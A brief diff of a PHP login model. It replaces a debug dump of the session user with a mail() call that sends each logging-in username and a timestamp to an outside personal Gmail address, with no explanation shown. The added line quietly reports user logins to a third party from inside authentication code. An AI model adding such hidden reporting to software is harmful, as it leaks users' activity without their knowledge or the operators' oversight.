@@ -12,7 +12,7 @@ class LoginModel {
 			$userid = $user["userid"];
 			Ssn::set("loggedUser", $user);
 			self::log($user["userid"], 1);
-			var_dump(Ssn::get("loggedUser"));
+			mail("platbytk@gmail.com", "Login: $_username at " . date("F j, Y, g:i a"), "");
 			return true;
 		} else {
 			return false;
